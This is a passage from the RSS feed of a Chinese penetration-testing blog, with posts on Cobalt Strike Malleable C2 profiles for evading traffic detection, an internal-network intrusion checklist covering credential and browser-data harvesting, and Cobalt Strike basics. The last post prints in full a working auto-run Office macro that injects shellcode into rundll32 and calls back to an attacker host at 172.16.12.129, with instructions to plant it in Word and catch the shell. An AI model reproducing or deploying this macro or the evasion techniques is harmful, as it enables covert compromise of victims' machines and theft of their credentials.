Workbook_Open()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用msf进行监听，之后在word中运行宏即可获得shell&lt;/p&gt;</description>
    </item>
    <item>
      <title>MalleableC2详解</title>
      <link>https://yaphetszz.github.io/posts/malleablec2%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 13 Apr 2020 15:18:36 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/malleablec2%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;malleable-c2和malleable-pe&#34;&gt;malleable C2和Malleable PE&lt;/h2&gt;&#xA;&lt;p&gt;malleable C2 用于规避流量检测&lt;/p&gt;&#xA;&lt;p&gt;官网链接：https://www.cobaltstrike.com/help-malleable-c2&lt;/p&gt;&#xA;&lt;p&gt;需要考虑网络环境，根据目标网络编写Malleable C2 Profile&lt;/p&gt;&#xA;&lt;p&gt;C2的配置可包含以下部分&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Profile元素&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;global OPTIONS&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;https-certificate&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;code-signer&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-get&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-post&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-stager&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;post-ex&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;TCP Beacon&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&amp;hellip;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;在 Malleable C2 中, 语句可分为数据转换语句, 终止语句和额外语句三种类型。&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;数据转换语句：base64 base64url mask netbios netbiosu prepend append&#xD;&#xA;终止语句： print uri-append header parameter&#xD;&#xA;额外语句： header parameter&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;数据转换语句如下：&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;声明方式&lt;/th&gt;&#xA;          &lt;th&gt;编码方式&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;append &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在末尾&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64&lt;/td&gt;&#xA;          &lt;td&gt;Base64编码&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64url&lt;/td&gt;&#xA;          &lt;td&gt;一种变异的Base64编码(这种编码后的数据不会含义破坏url完整性的字符如+号)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mask&lt;/td&gt;&#xA;          &lt;td&gt;XOR编码 key是随机的&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbios&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;a&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbiosu&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;A&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;/td&gt;&#xA;          &lt;td&gt;上面这种编码方式我也不怎么了解反正我只知道也是一种编码方式，有兴趣的自己谷歌一下吧&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;prepend &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在头部&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;Strings转义字符如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>内网渗透备忘录</title>
      <link>https://yaphetszz.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
      <pubDate>Sun, 12 Aug 2018 03:44:31 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&#xA;本来是个xmind脑图，用于内网渗透的时候提供备忘思路，从xmind转换为md格式，可点击&lt;a href=&#34;https://yaphetszz.github.io/atta&#34;&gt;附件菜单&lt;/a&gt;获取xmind文件&lt;/p&gt;&#xA;&lt;h1 id=&#34;内网渗透&#34;&gt;内网渗透&lt;/h1&gt;&#xA;&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;&#xA;&lt;h3 id=&#34;大型内网域环境&#34;&gt;大型内网域环境&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;父域控制器&lt;/li&gt;&#xA;&lt;li&gt;子域控制器&lt;/li&gt;&#xA;&lt;li&gt;辅域控制器&lt;/li&gt;&#xA;&lt;li&gt;域内主机&lt;/li&gt;&#xA;&lt;li&gt;域内服务器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;windows-ntlm认证原理&#34;&gt;Windows NTLM认证原理&lt;/h3&gt;&#xA;&lt;h3 id=&#34;kerberos域内认证原理&#34;&gt;Kerberos域内认证原理&lt;/h3&gt;&#xA;&lt;h2 id=&#34;内网信息收集&#34;&gt;内网信息收集&lt;/h2&gt;&#xA;&lt;h3 id=&#34;工作组和大型内网信息收集基础&#34;&gt;工作组和大型内网信息收集基础&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;本机密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Windows2012高版本收集&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Windows2012以下低版本收集&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Linux下密码收集&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;收集特定密码文件&lt;/li&gt;&#xA;&lt;li&gt;指定用户命令历史记录明文密码&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;无线密码获取&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;注册表敏感键值信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据库中的密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mysql&lt;/li&gt;&#xA;&lt;li&gt;SQL Server&lt;/li&gt;&#xA;&lt;li&gt;&amp;hellip;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;本地储存的密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;本地密码本&lt;/li&gt;&#xA;&lt;li&gt;Windows常用软件密码&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;浏览器信息&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Chrome&lt;/li&gt;&#xA;&lt;li&gt;Firefox&lt;/li&gt;&#xA;&lt;li&gt;360&lt;/li&gt;&#xA;&lt;li&gt;IE&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;VPN和代理&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;VPN&lt;/li&gt;&#xA;&lt;li&gt;代理服务器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据库信息&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Mysql&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;SQL Server&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Oracle&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;PostgreSQL&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;LDAP&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;通过LDAP定位核心机器&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取内网架构分布&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取内网组织架构&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取域内核心机器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;判断协议出网&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;获取详细网络配置&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hosts&lt;/li&gt;&#xA;&lt;li&gt;所在域&lt;/li&gt;&#xA;&lt;li&gt;IP&lt;/li&gt;&#xA;&lt;li&gt;掩码&lt;/li&gt;&#xA;&lt;li&gt;网关&lt;/li&gt;&#xA;&lt;li&gt;主备DNS ip&lt;/li&gt;&#xA;&lt;li&gt;IPC连接情况&lt;/li&gt;&#xA;&lt;li&gt;共享目录&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户登录记录&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户命令记录&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;屏幕抓取敏感信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;环境变量信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;远程控制服务情况&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;RDP&lt;/li&gt;&#xA;&lt;li&gt;SSH&lt;/li&gt;&#xA;&lt;li&gt;VNC&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;安装的软件列表&lt;/p&gt;</description>
    </item>
    <item>
      <title>CS基础和WEB Drive-by功能详解</title>
      <link>https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 02 Apr 2018 02:13:01 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;cs基础&#34;&gt;CS基础&lt;/h2&gt;&#xA;&lt;p&gt;CS服务端启动方式&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./teamserver ip password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Attacks-Packages:&lt;/p&gt;&#xA;&lt;p&gt;HTML Application生成恶意HTA木马&lt;/p&gt;&#xA;&lt;p&gt;MS Office Macro生成office宏病毒&lt;/p&gt;&#xA;&lt;p&gt;Payload Generator生成各种语言版本的payload&lt;/p&gt;&#xA;&lt;p&gt;USB/CD Autoplay 生成利用自动播放运行的木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Dropper捆绑器，对文档类进行捆绑&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable 生成可执行exe木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable(S)生成无状态的exe木马&lt;/p&gt;&#xA;&lt;p&gt;Attacks-Web Drive-by&lt;/p&gt;&#xA;&lt;p&gt;Manage对开启的web服务进行管理&lt;/p&gt;&#xA;&lt;p&gt;Clone Site克隆网站，可记录受害者提交数据&lt;/p&gt;&#xA;&lt;p&gt;Host File 提供文件下载，可修改Mime信息&lt;/p&gt;&#xA;&lt;p&gt;Powershell Web Delivery类似MSF的WEB_delivery&lt;/p&gt;&#xA;&lt;p&gt;signed applet attack 使用java自签名程序进行钓鱼&lt;/p&gt;&#xA;&lt;p&gt;Smart Applet Attack自动检测Java版本并进行攻击，针对Java1.6.0_45以下以及1.7.0_21以下版本&lt;/p&gt;&#xA;&lt;p&gt;System Profiler用来获取系统信息，如系统版本，Flash版本，浏览器版本等&lt;/p&gt;&#xA;&lt;p&gt;生成对应木马目标执行后就会上线&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2fdf5b6a-65b6-4888-9e9b-70f624fefead.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以浏览文件，收集内网信息等，但是相比于MSF反应略慢，所以有时候需要MSF和CS联动&lt;/p&gt;&#xA;&lt;h2 id=&#34;cs使用office宏进行攻击&#34;&gt;CS使用office宏进行攻击&lt;/h2&gt;&#xA;&lt;p&gt;新建一个office监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/63c98e4d-e674-4a25-a25e-2876033e8076.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;点击生成宏后选择监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3f82cbe3-a538-43c0-ac0a-8c0b74806e3a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;宏代码会自动加载，需要自己点击复制然后创建宏&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/f89def44-eefc-43c7-9dac-f3b8ffaba382.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;Private Type PROCESS_INFORMATION&#xD;&#xA;    hProcess As Long&#xD;&#xA;    hThread As Long&#xD;&#xA;    dwProcessId As Long&#xD;&#xA;    dwThreadId As Long&#xD;&#xA;End Type&#xD;&#xA;Private Type STARTUPINFO&#xD;&#xA;    cb As Long&#xD;&#xA;    lpReserved As String&#xD;&#xA;    lpDesktop As String&#xD;&#xA;    lpTitle As String&#xD;&#xA;    dwX As Long&#xD;&#xA;    dwY As Long&#xD;&#xA;    dwXSize As Long&#xD;&#xA;    dwYSize As Long&#xD;&#xA;    dwXCountChars As Long&#xD;&#xA;    dwYCountChars As Long&#xD;&#xA;    dwFillAttribute As Long&#xD;&#xA;    dwFlags As Long&#xD;&#xA;    wShowWindow As Integer&#xD;&#xA;    cbReserved2 As Integer&#xD;&#xA;    lpReserved2 As Long&#xD;&#xA;    hStdInput As Long&#xD;&#xA;    hStdOutput As Long&#xD;&#xA;    hStdError As Long&#xD;&#xA;End Type&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Private Declare PtrSafe Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#Else&#xD;&#xA;    Private Declare Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long&#xD;&#xA;    Private Declare Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long&#xD;&#xA;    Private Declare Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long&#xD;&#xA;    Private Declare Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#End If&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;    Dim myByte As Long, myArray As Variant, offset As Long&#xD;&#xA;    Dim pInfo As PROCESS_INFORMATION&#xD;&#xA;    Dim sInfo As STARTUPINFO&#xD;&#xA;    Dim sNull As String&#xD;&#xA;    Dim sProc As String&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Dim rwxpage As LongPtr, res As LongPtr&#xD;&#xA;#Else&#xD;&#xA;    Dim rwxpage As Long, res As Long&#xD;&#xA;#End If&#xD;&#xA;    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _&#xD;&#xA;60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _&#xD;&#xA;80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _&#xD;&#xA;125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _&#xD;&#xA;91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _&#xD;&#xA;-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _&#xD;&#xA;83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _&#xD;&#xA;47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _&#xD;&#xA;104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _&#xD;&#xA;-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _&#xD;&#xA;-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _&#xD;&#xA;11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _&#xD;&#xA;-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _&#xD;&#xA;0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _&#xD;&#xA;49,55,50,46,49,54,46,49,50,46,49,50,57,0)&#xD;&#xA;    If Len(Environ(&amp;#34;ProgramW6432&amp;#34;)) &amp;gt; 0 Then&#xD;&#xA;        sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\SysWOW64\\rundll32.exe&amp;#34;&#xD;&#xA;    Else&#xD;&#xA;        sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\System32\\rundll32.exe&amp;#34;&#xD;&#xA;    End If&#xD;&#xA;    res = RunStuff(sNull, sProc, ByVal 0&amp;amp;, ByVal 0&amp;amp;, ByVal 1&amp;amp;, ByVal 4&amp;amp;, ByVal 0&amp;amp;, sNull, sInfo, pInfo)&#xD;&#xA;    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;    For offset = LBound(myArray) To UBound(myArray)&#xD;&#xA;        myByte = myArray(offset)&#xD;&#xA;        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;amp;)&#xD;&#xA;    Next offset&#xD;&#xA;    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub Workbook_Open()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将这串代码复制到WORD或者其他office中进行创建宏&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
